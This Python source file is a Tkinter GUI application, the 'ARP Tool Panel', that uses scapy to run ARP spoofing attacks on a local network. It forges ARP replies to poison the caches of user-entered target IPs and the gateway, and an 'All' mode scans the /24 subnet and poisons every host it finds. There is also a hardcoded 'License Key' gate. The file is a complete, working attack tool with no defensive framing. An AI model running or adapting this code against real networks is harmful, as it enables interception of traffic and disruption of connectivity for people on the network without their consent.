import tkinter as tk
from tkinter import ttk
from scapy.all import ARP, Ether, send, srp, get_if_hwaddr, conf
import threading, time, os, platform, re, socket
from datetime import datetime

# -------- Global Variables --------
gateway_ip = None
gateway_mac = None
attacker_mac = None
try:
    attacker_mac = get_if_hwaddr(conf.iface)
except Exception:
    attacker_mac = None
attack_running = False
mode_all = False
ip_entries = []
detected_ips = []
device_names = []
options_visible = False

# -------- Network Functions --------
def get_mac(ip):
    if not ip:
        return None
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(ether / arp_request, timeout=2, verbose=0)[0]
    return result[0][1].hwsrc if result else None

def get_device_name(ip):
    try:
        name = socket.gethostbyaddr(ip)[0]
    except Exception:
        name = "Unknown"
    return name

# -------- Logging con animación y timestamp --------
def animate_text(widget, text, color_tag=None, delay=20, auto_clear=True):
    timestamp = datetime.now().strftime("[%H:%M:%S] ")
    widget.config(state="normal")
    if color_tag:
        widget.insert(tk.END, timestamp, color_tag)
    else:
        widget.insert(tk.END, timestamp)
    for char in text:
        if color_tag:
            widget.insert(tk.END, char, color_tag)
        else:
            widget.insert(tk.END, char)
        widget.see(tk.END)
        widget.update()
        time.sleep(delay / 1000)
    widget.insert(tk.END, "\n")
    widget.see(tk.END)
    widget.config(state="disabled")
    if color_tag == "error" and auto_clear:
        if "Could not get MAC" not in text:
            widget.after(1000, lambda: widget.config(state="normal") or widget.delete(1.0, tk.END) or widget.config(state="disabled"))

# -------- ARP Spoofing --------
def arp_spoof(widget_output):
    global attack_running
    if not ip_entries or not gateway_mac:
        animate_text(widget_output, "No target IPs or could not get gateway MAC.", "error")
        return
    try:
        while attack_running:
            for entry in ip_entries:
                target_ip = entry.get().strip()
                if not target_ip:
                    continue
                target_mac = get_mac(target_ip)
                if not target_mac:
                    animate_text(widget_output, f"Could not get MAC of {target_ip}", "error", auto_clear=False)
                    continue
                pkt_obj = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip,
                              hwsrc=attacker_mac, op=2)
                pkt_gw = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,
                             hwsrc=attacker_mac, op=2)
                send(pkt_obj, verbose=0)
                send(pkt_gw, verbose=0)
                animate_text(widget_output, f"Sending packets to {target_ip}")
            time.sleep(2)
    except Exception as e:
        animate_text(widget_output, f"Error: {e}", "error")

def arp_spoof_all(widget_output):
    global attack_running
    if not detected_ips or not gateway_mac:
        animate_text(widget_output, "No detected IPs or could not get gateway MAC.", "error")
        return
    try:
        while attack_running:
            for target_ip in detected_ips:
                target_mac = get_mac(target_ip)
                if not target_mac:
                    animate_text(widget_output, f"Could not get MAC of {target_ip}", "error", auto_clear=False)
                    continue
                pkt_obj = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip,
                              hwsrc=attacker_mac, op=2)
                pkt_gw = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,
                             hwsrc=target_mac, op=2)
                send(pkt_obj, verbose=0)
                send(pkt_gw, verbose=0)
                animate_text(widget_output, f"Sending packets to {target_ip}")
            time.sleep(2)
    except Exception as e:
        animate_text(widget_output, f"Error: {e}", "error")

# -------- Restore Connection --------
def restore_connection(widget_output):
    if mode_all:
        for target_ip in detected_ips:
            target_mac = get_mac(target_ip)
            if target_mac and gateway_mac:
                pkt_obj = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip,
                              hwsrc=gateway_mac, op=2)
                pkt_gw = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,
                             hwsrc=target_mac, op=2)
                send(pkt_obj, count=5, verbose=0)
                send(pkt_gw, count=5, verbose=0)
    time.sleep(1)
    animate_text(widget_output, "All connections have been restored.", "green")
    widget_output.after(1000, lambda: widget_output.config(state="normal") or widget_output.delete(1.0, tk.END) or widget_output.config(state="disabled"))

# -------- Attack Control --------
def start_spoofing():
    global attack_running, mode_all
    empty_ip = True
    for entry in ip_entries:
        if entry.get().strip():
            empty_ip = False
            break
    if empty_ip:
        animate_text(widget_output, "Enter at least one IP first.", "error")
        return
    widget_output.config(state="normal")
    widget_output.delete(1.0, tk.END)
    widget_output.config(state="disabled")
    attack_running = True
    mode_all = False
    status_label.config(text="Status: Active", fg="lightgreen")
    threading.Thread(target=arp_spoof, args=(widget_output,), daemon=True).start()

def start_spoofing_all():
    global attack_running, mode_all
    if not detected_ips:
        animate_text(widget_output, "No detected IPs. Use 'Scan'.", "error")
        return
    widget_output.config(state="normal")
    widget_output.delete(1.0, tk.END)
    widget_output.config(state="disabled")
    attack_running = True
    mode_all = True
    status_label.config(text="Status: Active", fg="lightgreen")
    threading.Thread(target=arp_spoof_all, args=(widget_output,), daemon=True).start()

def stop_spoofing():
    global attack_running
    attack_running = False
    status_label.config(text="Status: Inactive", fg="red")
    threading.Thread(target=restore_connection, args=(widget_output,), daemon=True).start()

# -------- Dynamic IP Fields --------
def add_ip(event=None):
    new_entry = tk.Entry(entry_frame, font=ENTRY_FONT, bg=ENTRY_COLOR, fg=TEXT_COLOR,
                         relief="flat", highlightthickness=1, highlightbackground="#333333",
                         highlightcolor="#666666", width=30)
    new_entry.pack(pady=0, ipady=0)
    ip_entries.append(new_entry)
    new_entry.bind("<Return>", add_ip)
    def on_backspace(event):
        if new_entry.get().strip() == "":
            if len(ip_entries) > 1:
                remove_ip(new_entry)
            return "break"
    new_entry.bind("<BackSpace>", on_backspace)
    new_entry.focus_set()
    target_ipady = 6
    target_pady = 5
    step = 1
    def animate(current_ipady=0, current_pady=0):
        nonlocal step
        if current_ipady < target_ipady or current_pady < target_pady:
            current_ipady = min(current_ipady + step, target_ipady)
            current_pady = min(current_pady + step, target_pady)
            new_entry.pack_configure(ipady=current_ipady, pady=current_pady)
            entry_frame.after(15, animate, current_ipady, current_pady)
    animate()

def remove_ip(entry=None):
    if entry is None:
        if len(ip_entries) <= 1:
            return
        last = ip_entries.pop()
    else:
        if len(ip_entries) <= 1:
            return
        last = entry
        ip_entries.remove(entry)
    def animate_shrink(ipady, pady):
        if ipady > 0 or pady > 0:
            ipady = max(ipady - 1, 0)
            pady = max(pady - 1, 0)
            last.pack_configure(ipady=ipady, pady=pady)
            entry_frame.after(15, animate_shrink, ipady, pady)
        else:
            last.destroy()
            if ip_entries:
                ip_entries[-1].focus_set()
    animate_shrink(6, 5)

# -------- Network Scan with Progress Bar --------
def scan_network():
    global detected_ips, device_names
    detected_ips = []
    device_names = []

    progress_frame.pack(fill="x", padx=40, pady=(0,10), before=output_frame)
    progress_set_value(0)

    animate_text(widget_output, "Scanning network...")
    if not gateway_ip:
        animate_text(widget_output, "Could not get gateway IP.", "error")
        progress_frame.pack_forget()
        return

    parts = gateway_ip.split('.')
    subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    result = srp(request, timeout=2, verbose=0)[0]

    total_ips = len(result)
    progress_set_max(max(total_ips, 1))

    animate_text(widget_output, "Active IPs found:")
    for i, (_, rcv) in enumerate(result, start=1):
        if rcv.psrc != gateway_ip:
            detected_ips.append(rcv.psrc)
            name = get_device_name(rcv.psrc)
            device_names.append(name)
            animate_text(widget_output, f"{rcv.psrc} - {name}")
        progress_set_value(i)
        widget_output.update()
        progress_update_ui()

    animate_text(widget_output, "Scan completed.", "green")
    progress_set_value(0)
    progress_frame.pack_forget()

def show_ips_only():
    global detected_ips
    detected_ips = []

    progress_frame.pack(fill="x", padx=40, pady=(0,10), before=output_frame)
    progress_set_value(0)

    animate_text(widget_output, "Scanning network...")
    if not gateway_ip:
        animate_text(widget_output, "Could not get gateway IP.", "error")
        progress_frame.pack_forget()
        return

    parts = gateway_ip.split('.')
    subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    result = srp(request, timeout=2, verbose=0)[0]

    total_ips = len(result)
    progress_set_max(max(total_ips, 1))

    animate_text(widget_output, "Active IPs found:")
    for i, (_, rcv) in enumerate(result, start=1):
        if rcv.psrc != gateway_ip:
            detected_ips.append(rcv.psrc)
            animate_text(widget_output, f"{rcv.psrc}")
        progress_set_value(i)
        widget_output.update()
        progress_update_ui()

    animate_text(widget_output, "Scan completed.", "green")
    progress_set_value(0)
    progress_frame.pack_forget()

# -------- Progress bar functions --------
def progress_set_max(n):
    try:
        progress_frame._max = int(n)
    except Exception:
        progress_frame._max = 1

def progress_set_value(v):
    try:
        progress_frame._value = int(v)
    except Exception:
        progress_frame._value = 0
    progress_update_ui()

def progress_update_ui():
    progress_bg.update_idletasks()
    total_px = progress_bg.winfo_width() or 1
    maxv = getattr(progress_frame, "_max", 1) or 1
    val = getattr(progress_frame, "_value", 0)
    fill_px = int(total_px * (val / maxv))
    if fill_px < 0:
        fill_px = 0
    if fill_px > total_px:
        fill_px = total_px
    progress_fill.place_configure(width=fill_px)
    progress_bg.update_idletasks()

# -------- Show/Hide Options --------
def toggle_options():
    global options_visible
    options_visible = not options_visible
    buttons = options_frame.winfo_children()
    if options_visible:
        options_frame.pack(fill="x", pady=(5,10))
        for i, btn in enumerate(buttons):
            options_frame.after(i*100, lambda b=btn: b.pack(side="left", expand=True, fill="x", padx=5))
    else:
        for btn in buttons:
            btn.pack_forget()
        options_frame.pack_forget()

# -------------------- LOGIN --------------------
def login_window():
    def verify_code():
        code = code_entry.get()
        if code == "root":
            win.destroy()
            start_app()
        else:
            error_label.config(text="Invalid code", fg="red")
            code_entry.delete(0, tk.END)

    win = tk.Tk()
    win.title("ARP Tool - Access")
    win.configure(bg="#0a0a0a")
    win.resizable(False, False)
    win.iconbitmap("icon.ico")   # ← icono agregado
    width, height = 420, 220
    x = (win.winfo_screenwidth() // 2) - (width // 2)
    y = (win.winfo_screenheight() // 2) - (height // 2)
    win.geometry(f"{width}x{height}+{x}+{y}")

    TITLE_FONT = ("Arial", 18, "bold")
    BUTTON_FONT = ("Arial", 12)
    TEXT_COLOR = "#ffffff"
    BUTTON_COLOR = "#007bff"

    title_label = tk.Label(win, text="License Key", font=TITLE_FONT, fg=TEXT_COLOR, bg="#0a0a0a")
    title_label.pack(pady=(30, 15))

    code_entry = tk.Entry(win, font=("Arial", 14), bg="#1a1a1a", fg=TEXT_COLOR,
                          relief="flat", justify="center", show="*")
    code_entry.pack(ipady=6, ipadx=30, pady=5)
    code_entry.bind("<Return>", lambda event: verify_code())
    code_entry.focus_set()

    verify_button = tk.Button(win, text="Enter", font=BUTTON_FONT, bg=BUTTON_COLOR, fg=TEXT_COLOR,
                              relief="flat", padx=20, pady=5, command=verify_code)
    verify_button.pack(pady=15)
    verify_button.configure(cursor="hand2")

    error_label = tk.Label(win, text="", font=("Arial", 10), bg="#0a0a0a")
    error_label.pack()
    win.mainloop()

# -------------------- MAIN APP --------------------
def start_app():
    global window, widget_output, entry_frame, buttons_main_frame, buttons_frame, options_frame
    global ENTRY_FONT, ENTRY_COLOR, TEXT_COLOR, gateway_ip, gateway_mac, status_label
    global progress_frame, progress_bg, progress_fill, output_frame

    window = tk.Tk()
    window.title("ARP Tool Panel")
    window.configure(bg="#0a0a0a")
    window.geometry("600x600")
    window.resizable(True, True)
    window.iconbitmap("icon.ico")   # ← icono agregado

    TITLE_FONT = ("San Francisco", 24, "bold")
    TEXT_COLOR = "#ffffff"
    ENTRY_COLOR = "#1a1a1a"
    SCROLL_BG = "#1a1a1a"
    ENTRY_FONT = ("San Francisco", 12)
    BUTTON_FONT = ("San Francisco", 13)

    COLOR_START = "#007bff"
    COLOR_STOP = "#dc3545"
    COLOR_OPTIONS = "#ffc107"

    title_label = tk.Label(window, text="ARP PANEL", font=TITLE_FONT, fg=TEXT_COLOR, bg="#0a0a0a")
    title_label.pack(pady=(20,15))

    entry_frame = tk.Frame(window, bg="#0a0a0a", pady=10)
    entry_frame.pack(fill="x", padx=40)
    initial_entry = tk.Entry(entry_frame, font=ENTRY_FONT, bg=ENTRY_COLOR, fg=TEXT_COLOR,
                             relief="flat", highlightthickness=1, highlightbackground="#333333",
                             highlightcolor="#666666", width=30)
    initial_entry.pack(pady=5, ipady=6)
    ip_entries.append(initial_entry)
    initial_entry.bind("<Return>", add_ip)
    def on_backspace(event):
        if initial_entry.get().strip() == "":
            return "break"
    initial_entry.bind("<BackSpace>", on_backspace)
    initial_entry.focus_set()

    buttons_main_frame = tk.Frame(window, bg="#0a0a0a")
    buttons_main_frame.pack(fill="x", padx=40)
    buttons_frame = tk.Frame(buttons_main_frame, bg="#0a0a0a")
    buttons_frame.pack(fill="x")

    def create_button(frame, text, color, hover_color, command):
        btn = tk.Button(frame, text=text, font=BUTTON_FONT, bg=color, fg=TEXT_COLOR,
                        relief="flat", padx=20, pady=10, bd=0, highlightthickness=0, command=command)
        btn.pack(side="left", expand=True, fill="x", padx=5)
        btn.configure(cursor="hand2")
        btn.bind("<Enter>", lambda e: btn.config(bg=hover_color))
        btn.bind("<Leave>", lambda e: btn.config(bg=color))
        return btn

    create_button(buttons_frame, "Start", COLOR_START, "#0069d9", start_spoofing)
    create_button(buttons_frame, "Stop", COLOR_STOP, "#c82333", stop_spoofing)
    create_button(buttons_frame, "Options", COLOR_OPTIONS, "#e0a800", toggle_options)

    status_label = tk.Label(buttons_main_frame, text="Status: Inactive", font=BUTTON_FONT,
                            bg="#0a0a0a", fg="red")
    status_label.pack(pady=(5,10))

    options_frame = tk.Frame(buttons_main_frame, bg="#0a0a0a")
    def create_gray_button(frame, text, command):
        btn = tk.Button(frame, text=text, font=BUTTON_FONT, bg=SCROLL_BG, fg=TEXT_COLOR,
                        relief="flat", padx=20, pady=10, bd=0, highlightthickness=0, command=command)
        btn.pack_forget()
        btn.configure(cursor="hand2")
        btn.bind("<Enter>", lambda e: btn.config(bg="#333333"))
        btn.bind("<Leave>", lambda e: btn.config(bg=SCROLL_BG))
        return btn

    create_gray_button(options_frame, "Add", add_ip)
    create_gray_button(options_frame, "Remove", remove_ip)
    create_gray_button(options_frame, "Scan", scan_network)
    create_gray_button(options_frame, "All", start_spoofing_all)
    create_gray_button(options_frame, "IPs Only", show_ips_only)
    options_frame.pack_forget()

    # --- Barra de progreso custom ---
    progress_frame = tk.Frame(window, bg="#0a0a0a")
    add_button_color = SCROLL_BG
    fill_color = "lightgreen"
    progress_bg = tk.Frame(progress_frame, bg=add_button_color, height=14)
    progress_bg.pack(fill="x", expand=True)
    progress_fill = tk.Frame(progress_bg, bg=fill_color, width=0, height=14)
    progress_fill.place(x=0, y=0, relheight=1, width=0)

    # --- Consola de salida con scrollbar oscura ---
    output_frame = tk.Frame(window, bg="#0a0a0a", pady=15)
    output_frame.pack(fill="both", expand=True, padx=40, pady=(0,20))

    console_container = tk.Frame(output_frame, bg="#0a0a0a")
    console_container.pack(fill="both", expand=True)

    widget_output = tk.Text(
        console_container,
        font=("Courier New",11),
        bg=SCROLL_BG,
        fg=TEXT_COLOR,
        relief="flat",
        bd=0,
        insertbackground=TEXT_COLOR,
        state="disabled",
        wrap="word"
    )
    widget_output.pack(side="left", fill="both", expand=True)

    scrollbar = tk.Scrollbar(
        console_container,
        orient="vertical",
        command=widget_output.yview,
        bg="#1a1a1a",
        troughcolor="#0a0a0a",
        activebackground="#333333",
        highlightthickness=0,
        relief="flat"
    )
    scrollbar.pack(side="right", fill="y")

    widget_output.config(yscrollcommand=scrollbar.set)

    widget_output.tag_config("green", foreground="lightgreen")
    widget_output.tag_config("error", foreground="red")

    def get_gateway_ip():
        system = platform.system()
        if system == "Windows":
            output = os.popen("route print 0.0.0.0").read()
            match = re.search(r"0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)", output)
            return match.group(1) if match else None
        else:
            output = os.popen("ip route | grep default").read()
            return output.split()[2] if output else None

    gateway_ip = get_gateway_ip()
    gateway_mac = get_mac(gateway_ip) if gateway_ip else None

    window.mainloop()

# -------------------- RUN --------------------
login_window()
